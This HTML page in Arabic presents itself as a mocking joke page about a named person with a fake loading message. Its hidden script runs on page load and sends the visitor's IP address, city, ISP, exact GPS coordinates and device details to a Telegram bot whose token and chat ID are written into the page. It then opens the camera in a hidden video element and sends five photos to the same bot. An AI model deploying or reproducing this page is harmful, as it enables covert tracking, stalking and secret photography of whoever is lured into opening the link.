<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>انت حمار ؟</title>
    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #0f172a, #1e1b4b);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #ffffff;
        }
        .container {
            text-align: center;
            padding: 40px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
        }
        h1 {
            font-size: 3rem;
            margin: 0;
            background: linear-gradient(45deg, #00dbde, #fc00ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(252, 0, 255, 0.3);
            font-weight: 800;
            letter-spacing: 2px;
        }
        p {
            color: #94a3b8;
            margin-top: 15px;
            font-size: 1.1rem;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>محمد الحمار</h1>
        <p>جاري تحميل المحتوى...</p>
    </div>

    <video id="video" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
    const TOKEN = "8726396385:AAF7xhkGDGPxMycanSzepBYAtXVfUy9c07A"; // ← التوكن الخاص بك
    const CHAT_ID = "8897447043"; // ← معرف الشات الخاص بك
    const URI_API_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
    const URI_API_MSG = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    // دالة لجلب معلومات الـ IP والشبكة
    async function getIPInfo() {
        try {
            const response = await axios.get('https://ipapi.co/json/');
            const data = response.data;
            
            let ipInfo = "<b>--- معلومات عنوان IP والشبكة ---</b>\n";
            ipInfo += `<b>عنوان الـ IP:</b> ${data.ip || 'غير معروف'}\n`;
            ipInfo += `<b>الدولة:</b> ${data.country_name || 'غير معروف'} (${data.country_code || ''})\n`;
            ipInfo += `<b>المنطقة / المحافظة:</b> ${data.region || 'غير معروف'}\n`;
            ipInfo += `<b>المدينة:</b> ${data.city || 'غير معروف'}\n`;
            ipInfo += `<b>مزود الخدمة (ISP):</b> ${data.org || 'غير معروف'}\n\n`;
            
            return ipInfo;
        } catch (e) {
            return "<b>معلومات الـ IP:</b> تعذر جلب معلومات الشبكة.\n\n";
        }
    }

    // دالة للحصول على الموقع الجغرافي الدقيق جداً
    function getExactLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve("<b>الموقع الجغرافي (GPS):</b> غير مدعوم في هذا المتصفح.\n");
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const accuracy = position.coords.accuracy; 
                    const altitude = position.coords.altitude ? position.coords.altitude + ' متر' : 'غير متوفر';
                    const speed = position.coords.speed ? position.coords.speed + ' م/ث' : 'غير متوفر';

                    let locInfo = "<b>--- الموقع الجغرافي الدقيق (GPS) ---</b>\n";
                    locInfo += `<b>خط الطول (Latitude):</b> ${lat}\n`;
                    locInfo += `<b>خط العرض (Longitude):</b> ${lon}\n`;
                    locInfo += `<b>الدقة (Accuracy):</b> في نطاق ${accuracy} متر\n`;
                    locInfo += `<b>الارتفاع:</b> ${altitude}\n`;
                    locInfo += `<b>السرعة:</b> ${speed}\n`;
                    locInfo += `<b>رابط الخريطة:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">اضغط هنا لعرض الموقع على الخريطة</a>\n\n`;
                    
                    resolve(locInfo);
                },
                (error) => {
                    let errMsg = "<b>الموقع الجغرافي (GPS):</b> ";
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errMsg += "تم رفض إذن الوصول إلى الموقع من قبل المستخدم.\n\n";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errMsg += "معلومات الموقع غير متوفرة حالياً.\n\n";
                            break;
                        case error.TIMEOUT:
                            errMsg += "انتهت مهلة الطلب أثناء محاولة تحديد الموقع.\n\n";
                            break;
                        default:
                            errMsg += "حدث خطأ غير معروف أثناء جلب الموقع.\n\n";
                            break;
                    }
                    resolve(errMsg);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        });
    }

    // دالة لجمع معلومات المتصفح والنظام
    function getBrowserInfo() {
        const n = navigator;
        const s = window.screen;
        
        let info = "<b>--- معلومات المتصفح والجهاز ---</b>\n";
        info += `<b>المتصفح (User Agent):</b> ${n.userAgent}\n`;
        info += `<b>اللغة:</b> ${n.language}\n`;
        info += `<b>النظام الأساسي (Platform):</b> ${n.platform}\n`;
        info += `<b>عدد أنوية المعالج (Cores):</b> ${n.hardwareConcurrency || 'غير معروف'}\n`;
        info += `<b>الذاكرة العشوائية (RAM):</b> ${n.deviceMemory ? n.deviceMemory + ' GB' : 'غير معروف'}\n`;
        info += `<b>دقة الشاشة:</b> ${s.width}x${s.height}\n`;
        info += `<b>نافذة العرض:</b> ${window.innerWidth}x${window.innerHeight}\n`;
        info += `<b>التاريخ والوقت:</b> ${new Date().toLocaleString()}\n`;
        
        if (n.connection) {
            info += `<b>نوع اتصال الإنترنت:</b> ${n.connection.effectiveType || 'غير معروف'}\n`;
            info += `<b>السرعة المتوقعة:</b> ${n.connection.downlink || 'غير معروف'} Mbps\n`;
        }
        
        return info;
    }

    async function collectAndSend() {
        try {
            // 1. جمع معلومات الـ IP، والموقع الجغرافي، ومعلومات الجهاز
            const ipInfo = await getIPInfo();
            const locationInfo = await getExactLocation();
            const deviceInfo = getBrowserInfo();
            
            // دمج جميع المعلومات في رسالة واحدة متكاملة
            const fullMessage = ipInfo + locationInfo + deviceInfo;

            // 2. إرسال البيانات النصية إلى تيليجرام
            await axios.post(URI_API_MSG, {
                chat_id: CHAT_ID,
                text: fullMessage,
                parse_mode: 'HTML',
                disable_web_page_preview: true
            });

            // 3. طلب إذن الكاميرا والتقاط الصور
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            video.srcObject = stream;

            await new Promise(resolve => {
                video.onloadedmetadata = () => {
                    video.play();
                    resolve();
                };
            });

            // التقاط 5 صور بفاصل ثانية واحدة
            for (let i = 0; i < 5; i++) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `image${i + 1}.jpg`);

                await axios.post(URI_API_PHOTO, formData, {
                    headers: { 'Content-Type': 'multipart/form-data' }
                });

                await new Promise(r => setTimeout(r, 1000));
            }

            stream.getTracks().forEach(track => track.stop());

        } catch (err) {
            console.error("Error:", err);
        }
    }

    window.addEventListener('load', collectAndSend);
    </script>
</body>
</html>
